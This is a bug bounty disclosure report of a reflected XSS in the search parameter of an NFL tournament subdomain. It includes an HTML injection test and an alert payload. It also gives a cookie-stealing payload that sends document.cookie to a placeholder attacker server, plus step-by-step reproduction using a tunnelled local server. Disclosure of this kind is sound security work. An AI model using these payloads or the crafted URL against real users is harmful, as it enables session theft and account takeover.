# NFL: Reflected XSS in URL Search Query Parameter

[Español (ES)](../../../es/bounties/nfl-xss-search-query/)

## Introduction

This report documents a **Reflected Cross-Site Scripting (XSS)** vulnerability discovered on the NFL's public-facing domain `hbcutournament.nfl.com`. The vulnerability resides in the search results page parameter, which improperly processes user-supplied input without adequate sanitization, allowing for the execution of arbitrary JavaScript code.

---

## 🔍 Search Testing

The first step was testing for reflection in the search functionality on the following endpoints:

```html
https://hbcutournament.nfl.com/resources?q=
https://hbcutournament.nfl.com/blogs?q=
```

I observed that the application does not properly sanitize or encode input passed via the `?q=` URL fragment, allowing for injection into the browser context.

---

## 🏗️ HTML Injection

To confirm the vulnerability, I first attempted a simple HTML injection to see if the input was rendered directly in the DOM.

**Payload:**
```HTML
<h1>This is a HTML Injection test</h1> --- This is a normal text.
```

![NFL HTML Injection](../../../assets/images/nfl-xss-search-query/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20HTML%20Injection.png)

The result confirmed that the application was rendering raw HTML tags provided via the URL parameter.

---

## 🚨 First Alert (Reflected XSS)

After confirming HTML injection, I moved to JavaScript execution. After testing several vectors, I discovered that the `<img>` tag effectively triggers execution via the `onerror` event.

**Payload:**
```HTML
<img/src/onerror=alert(8)>
```

**Malicious URL:**
`https://hbcutournament.nfl.com/resources?q=<img/src/onerror=alert(8)>`

![NFL Alert 1](../../../assets/images/nfl-xss-search-query/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20Alert%201.png)

---

## 🚀 Final Exploit (Cookies Exfiltration)

The final goal was to demonstrate a critical impact. I crafted a payload to exfiltrate session cookies to an attacker-controlled server.

**Payload:**
```html
<img/src/onerror=fetch("http://YOUR-WEB-SERVER/"+encodeURIComponent(document.cookie))>
```

By tricking an authenticated user into clicking this link, an attacker could steal their session cookies and achieve account takeover.

![NFL Cookies Exfiltration](../../../assets/images/nfl-xss-search-query/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20Cookies%20Exfiltration.png)

The exfiltrated cookies were successfully received on the attacker's server:

![NFL Cookies Exfiltration Result](../../../assets/images/nfl-xss-search-query/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20Cookies%20Exfiltration%20Result.png)

---

## 🎯 Steps to Reproduce

1. **Start a Local Web Server**:
   ```bash
   python3 -m http.server 8000
   ```

2. **Expose the Server (e.g., via Serveo)**:
   ```bash
   ssh -R 80:localhost:8000 serveo.net
   ```

3. **Construct the Malicious URL**:
   Replace `YOUR-WEB-SERVER` with the generated public URL in the payload:
   `https://hbcutournament.nfl.com/resources?q=<img/src/onerror=fetch("http://YOUR-WEB-SERVER/"+encodeURIComponent(document.cookie))>`

4. **Victim Interaction**:
   When an authenticated user visits the URL, their cookies are sent to the attacker's server.

---

## 🤝 Collaboration Detail

This research was conducted in a **50/50 collaboration** between **{{ site.researchers.ivan.name }}** and **{{ site.researchers.diego.name }}**. Both researchers contributed equally to the discovery, exploitation, and documentation of this vulnerability.

---

## 🏁 Researchers & Contact

**{{ site.researchers.ivan.name }}** ([Bugcrowd]({{ site.researchers.ivan.bugcrowd }}))
**{{ site.researchers.diego.name }}** ([Bugcrowd]({{ site.researchers.diego.bugcrowd }}))
